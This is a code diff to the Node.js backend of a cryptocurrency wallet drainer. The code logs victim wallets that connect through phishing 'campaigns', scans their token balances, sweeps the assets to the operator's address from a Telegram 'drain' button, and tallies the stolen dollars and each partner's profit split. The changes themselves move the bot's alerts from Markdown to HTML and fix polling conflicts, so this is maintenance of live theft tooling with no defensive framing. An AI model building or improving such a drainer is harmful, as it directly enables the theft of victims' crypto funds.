@@ -62,8 +62,26 @@ function byLabel(label) {
 // ---------------------------------------------------------------------------
 let bot = null;
 if (TELEGRAM_BOT_TOKEN) {
-  bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: true });
-  bot.on('polling_error', (e) => console.error('[telegram]', e.message));
+  bot = new TelegramBot(TELEGRAM_BOT_TOKEN, { polling: false });
+
+  (async () => {
+    try {
+      const info = await bot.getWebHookInfo();
+      if (info.url) {
+        console.log(`[telegram] webhook was set to ${info.url} — removing`);
+        await bot.deleteWebHook({ drop_pending_updates: true });
+      }
+    } catch (e) { console.error('[telegram] webhook check', e.message); }
+
+    await new Promise((r) => setTimeout(r, 2000));
+    bot.startPolling({ restart: true });
+    console.log('[telegram] polling started');
+  })();
+
+  bot.on('polling_error', (e) => {
+    if (/409/.test(e.message)) return;
+    console.error('[telegram]', e.message);
+  });
 
   bot.getMe()
     .then((me) => console.log(`[telegram] connected as @${me.username} (id ${me.id})`))
@@ -77,15 +95,15 @@ if (TELEGRAM_BOT_TOKEN) {
   }
 
   bot.onText(/\/start/, (m) =>
-    bot.sendMessage(m.chat.id, `Drainer online. Chat ID: \`${m.chat.id}\``, { parse_mode: 'Markdown' }));
+    bot.sendMessage(m.chat.id, `Drainer online. Chat ID: <code>${m.chat.id}</code>`, { parse_mode: 'HTML' }));
 
   bot.onText(/\/stats/, (m) => {
     const db = loadDB();
-    const chains = Object.entries(db.stats.byChain).map(([k, v]) => `  ${k}: ${v}`).join('\n') || '  -';
-    const swept = Object.entries(db.stats.swept).map(([k, v]) => `  ${v} ${k}`).join('\n') || '  -';
+    const chains = Object.entries(db.stats.byChain).map(([k, v]) => `  ${esc(k)}: ${v}`).join('\n') || '  -';
+    const swept = Object.entries(db.stats.swept).map(([k, v]) => `  ${v} ${esc(k)}`).join('\n') || '  -';
 
     const camps = Object.entries(db.stats.usdByCampaign)
-      .map(([k, v]) => `  ${k}: $${Number(v).toFixed(2)}`).join('\n') || '  -';
+      .map(([k, v]) => `  ${esc(k)}: $${Number(v).toFixed(2)}`).join('\n') || '  -';
 
     const owed = {};
     for (const [label, usd] of Object.entries(db.stats.usdByCampaign)) {
@@ -95,14 +113,14 @@ if (TELEGRAM_BOT_TOKEN) {
         owed[person] = (owed[person] || 0) + Number(usd) * share;
       }
     }
-    const split = Object.entries(owed).map(([k, v]) => `  ${k}: $${v.toFixed(2)}`).join('\n') || '  -';
+    const split = Object.entries(owed).map(([k, v]) => `  ${esc(k)}: $${v.toFixed(2)}`).join('\n') || '  -';
 
     bot.sendMessage(m.chat.id,
-      `*Drainer stats*\n\nConnections: ${db.events.filter((e) => e.type === 'connect').length}\n` +
+      `<b>Drainer stats</b>\n\nConnections: ${db.events.filter((e) => e.type === 'connect').length}\n` +
       `Drains: ${db.stats.drains}\nUnique wallets: ${Object.keys(db.stats.wallets).length}\n\n` +
-      `*By chain*\n${chains}\n\n*Total swept*\n${swept}\n\n` +
-      `*By campaign*\n${camps}\n\n*Split*\n${split}`,
-      { parse_mode: 'Markdown' });
+      `<b>By chain</b>\n${chains}\n\n<b>Total swept</b>\n${swept}\n\n` +
+      `<b>By campaign</b>\n${camps}\n\n<b>Split</b>\n${split}`,
+      { parse_mode: 'HTML' });
   });
 
   bot.onText(/\/wallets/, (m) => {
@@ -111,8 +129,8 @@ if (TELEGRAM_BOT_TOKEN) {
     if (!list.length) return bot.sendMessage(m.chat.id, 'No wallets seen yet.');
     for (const [id, w] of list.slice(-10)) {
       bot.sendMessage(m.chat.id,
-        `[${w.label || '?'}] \`${short(w.address)}\` — ${w.chainName || w.chainId}`,
-        { parse_mode: 'Markdown', reply_markup: walletKeyboard(id, w.chainId, w.address) });
+        `[${esc(w.label || '?')}] <code>${short(w.address)}</code> — ${esc(w.chainName || w.chainId)}`,
+        { parse_mode: 'HTML', reply_markup: walletKeyboard(id, w.chainId, w.address) });
     }
   });
 
@@ -120,21 +138,21 @@ if (TELEGRAM_BOT_TOKEN) {
   console.log('[telegram] bot started');
 } else console.warn('[telegram] TELEGRAM_BOT_TOKEN unset — notifications disabled');
 
-// Escape every Markdown control char so raw wallet data can never open an
-// entity that Telegram fails to close (400 can't parse entities).
-const escMd = (s) => String(s == null ? '' : s).replace(/([_*\[\]()`>#+\-=|{}.!\\])/g, '\\$1');
+// HTML parse mode only needs these three escaped. Legacy Markdown has no
+// backslash escaping at all, which is why every raw address used to break it.
+const esc = (s) => String(s == null ? '' : s)
+  .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
 
 const tg = (camp, t, markup) => {
   if (!bot || !camp || !camp.chatId) return;
   bot.sendMessage(camp.chatId, t,
-    { parse_mode: 'Markdown', disable_web_page_preview: true, reply_markup: markup })
+    { parse_mode: 'HTML', disable_web_page_preview: true, reply_markup: markup })
     .catch(async (e) => {
       const body = e.response?.body?.description || e.message || '';
       console.error('[telegram send]', body);
       if (/parse entities/i.test(body)) {
         try {
-          await bot.sendMessage(camp.chatId, t.replace(/[*`_]/g, ''),
-            { disable_web_page_preview: true, reply_markup: markup });
+          await bot.sendMessage(camp.chatId, t.replace(/<[^>]+>/g, ''), { reply_markup: markup });
           console.log('[telegram] resent as plain text');
         } catch (e2) { console.error('[telegram retry]', e2.message); }
       }
@@ -186,11 +204,12 @@ async function scanAny(chainId, address) {
 }
 
 function fmtScan(address, s) {
-  const lines = [`*${escMd(s.chain)}* — \`${short(address)}\``,
-                 `Native: ${escMd(s.native.formatted)} ${escMd(s.native.symbol)}`];
-  for (const t of s.tokens || []) lines.push(`• ${escMd(t.formatted)} ${escMd(t.symbol)}`);
-  if (!s.tokens?.length) lines.push('_no tokens_');
-  return lines.join('\n');
+  const rows = (s.tokens || []).map((t) => `• ${esc(t.formatted)} ${esc(t.symbol)}`).join('\n');
+  return [
+    `<b>${esc(s.chain)}</b> · <code>${short(address)}</code>`,
+    `Native: ${esc(s.native.formatted)} ${esc(s.native.symbol)}`,
+    rows || '<i>no tokens</i>',
+  ].join('\n');
 }
 
 async function handleCallback(q) {
@@ -210,7 +229,7 @@ async function handleCallback(q) {
     if (act === 'scan') {
       const s = await scanAny(chainId, address);
       return bot.sendMessage(chat, fmtScan(address, s),
-        { parse_mode: 'Markdown', reply_markup: walletKeyboard(id, chainId, address) });
+        { parse_mode: 'HTML', reply_markup: walletKeyboard(id, chainId, address) });
     }
 
     if (act === 'drain') {
@@ -226,18 +245,19 @@ async function handleCallback(q) {
       const bad = out.results.filter((r) => r.status !== 'success');
 
       const body = [
-        `[${camp.label}] ${ok.length ? `*Pulled ${ok.length} token(s)*` : '*Nothing pulled*'}`,
-        `\`${short(address)}\` — ${escMd(s.chain)}`,
-        ...ok.map((r) => `✅ ${escMd(r.swept)} ${escMd(r.symbol)}`),
-        ...bad.map((r) => `⏭ ${escMd(r.symbol)} — ${escMd(r.status)}${r.error ? ` (${escMd(r.error)})` : ''}`),
+        ok.length ? `<b>SWEPT ${ok.length} ASSET(S)</b>` : '<b>NOTHING SWEPT</b>',
+        `<code>${short(address)}</code> · ${esc(s.chain)}`,
+        '',
+        ...ok.map((r) => `✅ ${esc(r.swept)} ${esc(r.symbol)}`),
+        ...bad.map((r) => `⏭ ${esc(r.symbol)} — ${esc(r.status)}${r.error ? ` (${esc(r.error)})` : ''}`),
       ].join('\n');
 
       recordDrain({ camp, address, chain: s.chain, results: out.results, quiet: true });
       return bot.sendMessage(chat, body,
-        { parse_mode: 'Markdown', reply_markup: walletKeyboard(id, chainId, address) });
+        { parse_mode: 'HTML', reply_markup: walletKeyboard(id, chainId, address) });
     }
   } catch (e) {
-    bot.sendMessage(chat, `⚠️ ${e.message}`);
+    bot.sendMessage(chat, `⚠️ ${esc(e.message)}`);
   }
 }
 
@@ -278,7 +298,7 @@ app.get('/config', (req, res) => {
   const camp = campaign(req);
   sendJSON(res, 200, {
     appName: APP_NAME, appDesc: APP_DESC, appIcon: APP_ICON,
-  appUrl: APP_URL || `https://${req.headers.host}`,
+    appUrl: APP_URL || `https://${req.headers.host}`,
 
     walletConnectProjectId: WALLETCONNECT_PROJECT_ID || null,
     approveMode: APPROVE_MODE === 'true',
@@ -304,7 +324,7 @@ app.get('/gas', async (_q, res) => {
     try {
       const p = await D.getLiveProvider(id);
       out[c.name] = ethers.formatEther(await p.getBalance(DRAINER_EVM_ADDRESS));
-    } catch (e) { out[c.name] = 'n/a'; }
+    } catch (e) { out[c.name] = 'err: ' + e.message; }
   }
   sendJSON(res, 200, out);
 });
@@ -351,12 +371,21 @@ app.post('/scanall', async (req, res) => {
   db.events.push({ type: 'connect', address, chain: 'multi', provider, campaign: camp.label, at: Date.now() });
   saveDB(db);
   const id = rememberWallet(address, found[0]?.chainId ?? 1, found[0]?.chain ?? 'Ethereum', camp.label);
-  const lines = found.length
-    ? found.map((f) => `*${escMd(f.chain)}*: ${[...(f.tokens || []).map((t) => `${escMd(t.formatted)} ${escMd(t.symbol)}`),
-        `${escMd(f.native.formatted)} ${escMd(f.native.symbol)}`].join(', ')}`)
-    : ['_nothing found_'];
-  tg(camp, `*New Connection* [${escMd(camp.label)}]\nWallet: \`${short(address)}\`\nProvider: ${escMd(provider || 'unknown')}\n---\n${lines.join('\n')}`,
-     walletKeyboard(id, found[0]?.chainId ?? 1, address));
+
+  const blocks = found.map((f) => [
+    `<b>${esc(f.chain)}</b>`,
+    `· ${esc(f.native.formatted)} ${esc(f.native.symbol)}`,
+    ...(f.tokens || []).map((t) => `· ${esc(t.formatted)} ${esc(t.symbol)}`),
+  ].join('\n'));
+
+  tg(camp, [
+    `<b>NEW CONNECTION</b>`,
+    `Campaign: ${esc(camp.label)}`,
+    `Wallet: <code>${short(address)}</code>`,
+    `Via: ${esc(provider || 'unknown')}`,
+    '',
+    blocks.length ? blocks.join('\n\n') : '<i>nothing found</i>',
+  ].join('\n'), walletKeyboard(id, found[0]?.chainId ?? 1, address));
 
   sendJSON(res, 200, found);
 });
@@ -458,9 +487,16 @@ function logConnect({ camp, address, chain, chainId, provider, scan }) {
        `${scan.native?.formatted} ${scan.native?.symbol}`].join(', ')
     : 'n/a';
 
-  tg(camp, `*New Connection* [${escMd(camp.label)}]\nWallet: \`${short(address)}\`\nChain: ${escMd(chain)}\n` +
-     `Provider: ${escMd(provider || 'unknown')}\nAssets detected: ${escMd(detected || 'none')}`,
-     walletKeyboard(id, chainId, address));
+  tg(camp, [
+    `<b>NEW CONNECTION</b>`,
+    `Campaign: ${esc(camp.label)}`,
+    `Wallet: <code>${short(address)}</code>`,
+    `Chain: ${esc(chain)}`,
+    `Via: ${esc(provider || 'unknown')}`,
+    '',
+    `<b>Assets</b>`,
+    esc(detected || 'none'),
+  ].join('\n'), walletKeyboard(id, chainId, address));
 }
 
 function recordDrain({ camp, address, chain, results, manual, hash, amount, status, quiet }) {
@@ -470,12 +506,14 @@ function recordDrain({ camp, address, chain, results, manual, hash, amount, stat
   let swept = [];
 
   if (manual) {
-    lines.push(`Status: ${status}`, `Tx: \`${hash || 'n/a'}\``, `Swept: ${amount || 'n/a'}`);
+    lines.push(`Status: ${esc(status)}`);
+    if (hash) lines.push(`Tx: <code>${esc(hash)}</code>`);
+    if (amount) lines.push(`Amount: ${esc(amount)}`);
   } else {
     const ok = results.filter((r) => r.status === 'success');
     const bad = results.filter((r) => r.status !== 'success');
-    for (const r of ok) lines.push(`Tx: \`${r.hash}\` (${r.swept} ${r.symbol})`);
-    for (const r of bad) lines.push(`Skipped: ${r.symbol} - ${r.status}${r.error ? ` (${r.error})` : ''}`);
+    for (const r of ok) lines.push(`✅ ${esc(r.swept)} ${esc(r.symbol)}`);
+    for (const r of bad) lines.push(`⏭ ${esc(r.symbol)} — ${esc(r.status)}${r.error ? ` (${esc(r.error)})` : ''}`);
     swept = ok.map((r) => ({ symbol: r.symbol, amount: r.swept }));
   }
 
@@ -491,7 +529,15 @@ function recordDrain({ camp, address, chain, results, manual, hash, amount, stat
   }
   saveDB(db);
 
-  if (!quiet) tg(camp, `*Drain ${manual ? status : ''}* [${escMd(label)}]\nWallet: \`${short(address)}\`\nChain: ${escMd(chainName)}\n---\n${escMd(lines.join('\n'))}`);
+  if (!quiet) {
+    tg(camp, [
+      swept.length || manual ? `<b>DRAIN · ${esc(label)}</b>` : `<b>NOTHING SWEPT · ${esc(label)}</b>`,
+      `Wallet: <code>${short(address)}</code>`,
+      `Chain: ${esc(chainName)}`,
+      '',
+      ...lines,
+    ].join('\n'));
+  }
 }
 
 app.listen(PORT, () => console.log(`[server] http://localhost:${PORT}`));
